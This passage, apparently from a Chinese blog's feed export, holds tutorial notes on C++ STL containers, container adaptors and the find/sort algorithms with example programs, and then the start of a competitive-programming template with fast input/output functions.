队头压入元素</span></span><br><span class="line">    l.<span class="built_in">push_front</span>(<span class="number">5</span>);</span><br><span class="line">    l.<span class="built_in">push_front</span>(<span class="number">6</span>);</span><br><span class="line">    l.<span class="built_in">pop_back</span>();                                <span class="comment">// 尾后弹出一个元素</span></span><br><span class="line">    l.<span class="built_in">pop_front</span>();                                <span class="comment">// 队头弹出一个元素</span></span><br><span class="line">    l.<span class="built_in">front</span>();                                    <span class="comment">// 取队头元素</span></span><br><span class="line">    l.<span class="built_in">back</span>();                                    <span class="comment">// 取队尾元素</span></span><br><span class="line"></span><br><span class="line">    l.<span class="built_in">insert</span>(l.<span class="built_in">begin</span>(), <span class="number">88</span>);                    <span class="comment">// 某个位置插入元素(性能好)</span></span><br><span class="line">    l.<span class="built_in">remove</span>(<span class="number">2</span>);                                <span class="comment">// 删除某个元素(和所给值相同的都删除)</span></span><br><span class="line">    l.<span class="built_in">reverse</span>();                                <span class="comment">// 倒置所有元素</span></span><br><span class="line">    l.<span class="built_in">erase</span>(--l.<span class="built_in">end</span>());                            <span class="comment">// 删除某个位置的元素(性能好)</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- forward_list容器一些操作  --------------*/</span></span><br><span class="line">    forward_list&lt;<span class="type">int</span>&gt; fl = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    fl.<span class="built_in">push_front</span>(<span class="number">0</span>);                <span class="comment">// 压入元素，该容器没有push_back方法</span></span><br><span class="line">    <span class="keyword">auto</span> prev = fl.<span class="built_in">before_begin</span>();    <span class="comment">// 表示fl的&quot;首前元素&quot;</span></span><br><span class="line">    <span class="keyword">auto</span> curr = fl.<span class="built_in">begin</span>();            <span class="comment">// 表示fl的第一个元素</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历</span></span><br><span class="line">    <span class="keyword">while</span> (curr != fl.<span class="built_in">end</span>())        <span class="comment">// 表示仍有元素要处理</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*curr % <span class="number">2</span>)                <span class="comment">// 若元素为奇数，则删除</span></span><br><span class="line">        &#123;</span><br><span class="line">            curr = fl.<span class="built_in">erase_after</span>(prev);    <span class="comment">// 删除它并移动curr</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            prev = curr;            <span class="comment">// 移动迭代器curr，指向下一个元素，prev指向curr之前的元素</span></span><br><span class="line">            ++curr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 操作后： fl = &#123;0, 2, 4, 6, 8&#125;</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- array容器一些操作  --------------------*/</span></span><br><span class="line">    array&lt;<span class="type">int</span>, 5&gt; myArray1 = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;    <span class="comment">// 定义一个一维数组</span></span><br><span class="line">    array&lt;array&lt;<span class="type">int</span>, 2&gt;, 3&gt; myArray2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;    <span class="comment">// 定义一个二维数组</span></span><br><span class="line">    array&lt;<span class="type">int</span>, 5&gt; myArray3 = &#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    array&lt;<span class="type">int</span>, 5&gt; myArray4;                <span class="comment">// 此数组并未初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// array.resize();        // array 不能有改变容器大小的操作，它的效率比vector高</span></span><br><span class="line">    myArray1.<span class="built_in">swap</span>(myArray3);<span class="comment">// 交换两个数组的的元素</span></span><br><span class="line">    myArray4 = myArray1;    <span class="comment">// 支持直接这样赋值，原生的数组不可以这样。它把值全部复制过去，而不是引用</span></span><br><span class="line">    myArray1.<span class="built_in">assign</span>(<span class="number">0</span>);        <span class="comment">// 把myArray1的元素全部置为0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历数组元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; myArray1.<span class="built_in">size</span>(); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; myArray1[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关联容器</strong></p>
<p>关联容器(associative-container)和顺序容器有着根本的不同：关联容器中元素定义是按关键字来保存和访问的。与之相对，顺序容器中的元素是按他们在容器中的位置来顺序保存和访问的。虽然关联容器的很多行为和顺序容器相同，但其不同之处反映了关键字的作用。</p>
<p>关联容器支持高效的关键字查询和访问。标准库一共定义了8个关联容器，最主要的类型是map和set。8个容器中，每个容器：</p>
<ul>
<li><p>是一个map或者是一个set。map保存关键字-值对；set只保存关键字。</p>
</li>
<li><p>要求关键字唯一或者不要求。</p>
</li>
<li><p>保持关键字有序或者不保证有序。</p>
</li>
</ul>
<p><strong>关联容器类型：</strong></p>
<p>按关键字有序保存元素</p>
<ul>
<li><p>map : 关联数组；保存关键字-值对</p>
</li>
<li><p>set : 关键字即值，即只保存关键字的容器</p>
</li>
<li><p>multimap : 关键字可重复的map</p>
</li>
<li><p>multiset ：关键字可重复的set</p>
</li>
</ul>
<p>无序集合</p>
<ul>
<li><p>unordered_map ： 用哈希函数组织的map</p>
</li>
<li><p>unordered_set : 用哈希函数组织的set</p>
</li>
<li><p>unordered_multimap ： 哈希组织的map;关键字可以重复出现</p>
</li>
<li><p>unordered_multiset : 哈希组织的set;关键字可以重复出现</p>
</li>
</ul>
<p>从上面的容器名称可以看出：允许重复关键字的容器名字都包含multi；而使用哈希技术的容器名字都以unordered开头。</p>
<p><strong>pair类型</strong></p>
<p>使用关联容器，绕不开pair类型。它定义在标准库头文件utility中。一个pair保存两个数据成员。类似容器，pair是一个用来生成特定类型的模板。当创建pair时，我们必须提供两个类型名，pair的成员将具有对应的类型。与其他标准库类型不同，pair的数据成员是public的。两个成员分别命名为first和second。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pair&lt;string, string&gt; author&#123;&quot;Stanley&quot;, &quot;C++ Prime&quot;&#125;;    // 构造一个pair</span><br><span class="line"></span><br><span class="line">make_pair(v1, v2);                                        // 返回一个用v1和v2初始化的pair。pair的类型从v1和v2的类型推断出来</span><br></pre></td></tr></table></figure>
<p><strong>map的使用</strong></p>
<p>下面的程序是统计每个单词在输入中出现的次数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 统计每个单词在输入中出现的次数</span></span><br><span class="line">    map&lt;string, <span class="type">size_t</span>&gt; word_count;        <span class="comment">// string到map的空map</span></span><br><span class="line">    string word;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; word)</span><br><span class="line">    &#123;</span><br><span class="line">        ++word_count[word];                <span class="comment">// 提取word的计数器并将其加1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;w : word_count)    <span class="comment">// 遍历map的每个元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; w.first &lt;&lt; <span class="string">&quot;出现的次数为: &quot;</span> &lt;&lt; w.second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>set的使用</strong></p>
<p>对上面那个统计单词的程序做一个扩展，忽略常见单词。比如 the and or then等。 我们使用set保存想要忽略的单词，只对不在集合中的单词进行统计。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 统计每个单词在输入中出现的次数</span></span><br><span class="line">    map&lt;string, <span class="type">size_t</span>&gt; word_count;        <span class="comment">// string到map的空map</span></span><br><span class="line">    set&lt;string&gt; exclude = &#123;<span class="string">&quot;The&quot;</span>, <span class="string">&quot;But&quot;</span>, <span class="string">&quot;And&quot;</span>, <span class="string">&quot;Or&quot;</span>, <span class="string">&quot;An&quot;</span>, <span class="string">&quot;A&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;the&quot;</span>, <span class="string">&quot;but&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;an&quot;</span>, <span class="string">&quot;a&quot;</span>&#125;;</span><br><span class="line">    string word;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; word)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 只统计不在exclude中的单词。find调用返回一个迭代器，如果在集合中，返回的迭代器指向其该关键中。否则返回尾后迭代器</span></span><br><span class="line">        <span class="keyword">if</span> (exclude.<span class="built_in">find</span>(word) == exclude.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            ++word_count[word];                <span class="comment">// 提取word的计数器并将其加1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;w : word_countm)    <span class="comment">// 遍历map的每个元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; w.first &lt;&lt; <span class="string">&quot;出现的次数为: &quot;</span> &lt;&lt; w.second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="容器适配器"><a href="#容器适配器" class="headerlink" title="容器适配器"></a>容器适配器</h3><p>除了顺序容器外，标准库还定义了三个顺序容器适配器:<strong>stack、 queue</strong>和<strong>priority_queue</strong>。 适配器(adaptor)是标准库的一个通用概念。容器、迭代器和函数都有适配器。</p>
<blockquote>
<p>本质上，一个适配器是一种机制，能使某种事物的行为看起来像另一种事物一样。</p>
</blockquote>
<p><strong>所有容器适配器都支持的操作和类型</strong></p>
<ul>
<li><p>size_type : 一种类型，足以保存当前类型的最大对象的大小</p>
</li>
<li><p>value_type : 元素类型</p>
</li>
<li><p>container_type : 实现适配器的底层容器类型</p>
</li>
<li><p>A a : 创建一个名为a的空适配器</p>
</li>
<li><p>A a(c) : 创建一个名为a的适配器，带有容器c的一个拷贝</p>
</li>
<li><p>关系运算符 : 每个适配器都支持所有关系运算符： &#x3D;&#x3D;、！&#x3D;、&lt;、&lt;&#x3D;、&gt;、和&gt;&#x3D;。这些运算符返回底层容器的比较结果。</p>
</li>
<li><p>a.empty() ： 若a包含任何元素，返回fasle，反正返回true</p>
</li>
<li><p>a.size() : 返回a中的元素数目</p>
</li>
<li><p>swap(a, b) : 或写作a.swap(b)、b.swap(a)。交换a和b的内容。a和b必须有相同的类型，包括底层容器类型也必须相同</p>
</li>
</ul>
<p><strong>栈适配器(stack)的额外操作</strong></p>
<ul>
<li><p>s.pop() : 删除栈顶元素，但不返回该元素值。</p>
</li>
<li><p>s.push(item) : 创建一个新元素压入栈顶</p>
</li>
<li><p>s.emplace(args) ： 同push，其值由args构造</p>
</li>
<li><p>s.top() ： 返回栈顶元素，但不将元素弹出栈</p>
</li>
<li><p>queue和priority_queue的额外操作</p>
</li>
<li><p>q.pop() : 返回queue的首元素或priority_queue的最高优先级的元素，但不删除此元素。</p>
</li>
<li><p>q.front() : 返回首元素或者尾元素，但不删除此元素</p>
</li>
<li><p>q.back() : 只使用于queue</p>
</li>
<li><p>q.top() : 返回最高优先级元素，但不删除此元素</p>
</li>
<li><p>q.push(item) : 在queue末尾或者priority_queue中恰当的位置创建一个元素，其值为item</p>
</li>
<li><p>q.emplace(args) : 同push,其值由args构造</p>
</li>
</ul>
<blockquote>
<p>栈默认基于deque实现。queue默认基于deque实现。priority_queue默认基于vector实现。</p>
</blockquote>
<p>stack和queue的使用方法比较简单，priority_queue在存储自己定义的数据结构时，必须重载 operator &lt; 或者自己写仿函数。下面给个简单的例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyCmp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 自定义的比较函数</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span> <span class="params">()</span><span class="params">(Node a, Node b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.x == b.x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> a.y &gt; b.y;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> a.x &gt; b.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// priority_queue&lt;Type, Container, Functional&gt;</span></span><br><span class="line">    <span class="comment">// Type 为数据类型，Container 为保存数据的容器，Functional 为元素比较方式</span></span><br><span class="line">    priority_queue&lt;Node, vector&lt;Node&gt;, MyCmp&gt;  myQueue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加一些元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        Node node;</span><br><span class="line">        node.x = i;</span><br><span class="line">        node.y = i * i;</span><br><span class="line">        myQueue.<span class="built_in">push</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历元素</span></span><br><span class="line">    <span class="keyword">while</span> (!myQueue.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; myQueue.<span class="built_in">top</span>().x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; myQueue.<span class="built_in">top</span>().y &lt;&lt; endl;</span><br><span class="line">        myQueue.<span class="built_in">pop</span>();            <span class="comment">// 出队</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="泛型算法"><a href="#泛型算法" class="headerlink" title="泛型算法"></a>泛型算法</h3><p>虽然容器提供了众多操作，但有些常见的操作，比如查找特定的元素，替换或者删除某个特定值，重新排序等，这些由一组泛型算法(generic algorithm)来实现。</p>
<p>大多数的算法都定义在头文件algorithm中，有些关于数值的泛型算法定义在numeric这个头文件中。</p>
<p>标准库提供了上百个算法，幸运地是，它们的算法结构基本上是一致的。这样我们就不用死记硬背了。</p>
<p><strong>算法的形参模式</strong></p>
<p>大多数的算法具有如下4种形式之一：</p>
<ul>
<li><p>alg(beg, end, other args);</p>
</li>
<li><p>alg(beg, end, dest, other args);</p>
</li>
<li><p>alg(beg, end, beg2, other args);</p>
</li>
<li><p>alg(beg, end, beg2, end2, other args);</p>
</li>
</ul>
<p>其中alg是算法的名字,beg和end表示算法所操作的输入范围。dest表示指定目的位置,beg2和end2表示接受第二个范围。</p>
<blockquote>
<p>标准算法库对迭代器而不是容器进行操作。因此，算法不能直接添加或者删除元素(可以调用容器本身的操作来完成)。</p>
</blockquote>
<p>find和sort是两个比较常见的泛型算法，我们以这两个为例子，来演示一下泛型算法的使用。</p>
<p><strong>find的简单使用</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> val = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> &#125;;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vec = &#123; <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>, <span class="number">99</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找元素的范围是第2个元素到第8个元素，支持内置数组</span></span><br><span class="line">    <span class="comment">// 如果找到想要的元素，则返回结果指向它</span></span><br><span class="line">    <span class="keyword">auto</span> result = <span class="built_in">find</span>(arr + <span class="number">1</span>, arr + <span class="number">7</span>, val);</span><br><span class="line">    cout &lt;&lt; *result &lt;&lt; endl;    <span class="comment">// 输出结果为 5,如果没找到返回7，想一下为什么</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> val2 = <span class="number">100</span>;</span><br><span class="line">    <span class="comment">// 没有找到这个值，返回vec.cend()</span></span><br><span class="line">    <span class="keyword">auto</span> res = <span class="built_in">find</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>(), val2);</span><br><span class="line">    <span class="keyword">if</span> (res == vec.<span class="built_in">cend</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;没找到元素!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *res &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简述一下find的执行步骤</p>
<ol>
<li>访问序列中的元素</li>
<li>比较此元素与我们要查找的值</li>
<li>如果此元素与我们要查找的值匹配，find返回标示此元素的值。</li>
<li>否则,find前进到下一个元素，重复执行步骤2和3。</li>
<li>如果到达序列尾,find停止。</li>
<li>如果find到达序列末尾，它应该返回一个指出元素未找到的值。此值和步骤3中返回的值必须具有相同的类型。</li>
</ol>
<p><strong>sort的简单使用</strong></p>
<p>参数形式为：sort(beg, end, cmp)</p>
<p>对于基本数据类型，第三个参数是可以省略的，有默认的实现。但对于自定义的数据类型，我们要提供第三个参数。第三个参数叫做谓词(predicate)。标准库有一元谓词(unary predicate)和二元谓词(binary predicate)之分，分别表示只接受1个参数和只接受2个参数。</p>
<p>下面实现一个小程序，有语文和数学两门课的成绩，按总分从大到小排序。如果总分相同，数学成绩高的排在前面。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CoureSocre</span></span><br><span class="line">&#123;</span><br><span class="line">    string name;    <span class="comment">// 姓名</span></span><br><span class="line">    <span class="type">int</span> math;        <span class="comment">// 数学成绩</span></span><br><span class="line">    <span class="type">int</span> chinese;    <span class="comment">// 语文成绩</span></span><br><span class="line">    <span class="type">int</span> total;        <span class="comment">// 总成绩</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CoureSocre</span>(string _name, <span class="type">int</span> _math, <span class="type">int</span> _chinese)</span><br><span class="line">    &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        math = _math;</span><br><span class="line">        chinese = _chinese;</span><br><span class="line">        total = math + chinese;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">myCmp</span><span class="params">(CoureSocre c1, CoureSocre c2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 如果总成绩相同</span></span><br><span class="line">    <span class="keyword">if</span> (c1.total == c2.total)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> c1.math &gt;= c2.math;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c1.total &gt; c2.total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化5个学生的程序</span></span><br><span class="line">    <span class="function">CoureSocre <span class="title">c1</span><span class="params">(<span class="string">&quot;Ace&quot;</span>, <span class="number">90</span>, <span class="number">95</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c2</span><span class="params">(<span class="string">&quot;Shawna&quot;</span>, <span class="number">99</span>, <span class="number">100</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c3</span><span class="params">(<span class="string">&quot;Kelly&quot;</span>, <span class="number">100</span>, <span class="number">99</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c4</span><span class="params">(<span class="string">&quot;Jordan&quot;</span>, <span class="number">88</span>, <span class="number">90</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c5</span><span class="params">(<span class="string">&quot;Kobe&quot;</span>, <span class="number">90</span>, <span class="number">88</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加入容器</span></span><br><span class="line">    vector&lt;CoureSocre&gt; vecScoreList = &#123; c1, c2, c3, c4, c5 &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用sort算法进行排序</span></span><br><span class="line">    <span class="built_in">sort</span>(vecScoreList.<span class="built_in">begin</span>(), vecScoreList.<span class="built_in">end</span>(), myCmp);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;学生的成绩排名为:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="function"><span class="keyword">for</span> <span class="title">each</span> <span class="params">(CoureSocre c in vecScoreList)</span>        <span class="comment">// 使用for each 算法进行遍历</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;姓名:&quot;</span> &lt;&lt; c.name &lt;&lt; <span class="string">&quot;\t总成绩:&quot;</span> &lt;&lt; c.total &lt;&lt; <span class="string">&quot;\t数学:&quot;</span> &lt;&lt; c.math &lt;&lt; <span class="string">&quot;\t语文:&quot;</span> &lt;&lt; c.chinese &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外一个和sort相关的是stable_sort算法。这种稳定排序算法维持相等元素的原有顺序。</p>
<p>传递的谓词只能接受1个或者2个参数，如果我们想传入更多的参数怎么办呢，这就超出了算法对谓词的限制。这时候，我们就需要上lambda表达式了。具体细节以后会介绍。</p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>C++ STL很好很强大，熟练使用它将使你如虎添翼。补充一个新手常踩的坑，在使用for循环时，不要在里面使用改变迭代器的操作，比如insert和erase，这些操作会使迭代器失效，从而引发意想不到的bug。</p>
<p>链接：<a href="http://www.jianshu.com/p/26d4d60233a4">http://www.jianshu.com/p/26d4d60233a4</a></p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>板子</title>
    <url>/ACM/standardnotes/2023/10/24/</url>
    <content><![CDATA[<blockquote>
<p>十年 OI 一场空，不开 long long 见祖宗。</p>
</blockquote>
<h1 id="缺省源"><a href="#缺省源" class="headerlink" title="缺省源"></a>缺省源</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>,f=<span class="number">1</span>;<span class="type">char</span> ch=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))&#123;<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) f=<span class="number">-1</span>;ch=<span class="built_in">getchar</span>();&#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))&#123;res=res*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;ch=<span class="built_in">getchar</span>();&#125;</span><br><span class="line">    <span class="keyword">return</span> res*f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>)&#123;<span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);x=-x;&#125;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;<span class="number">9</span>) <span class="built_in">write</span>(x/<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(x%<span class="number">10</span>+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

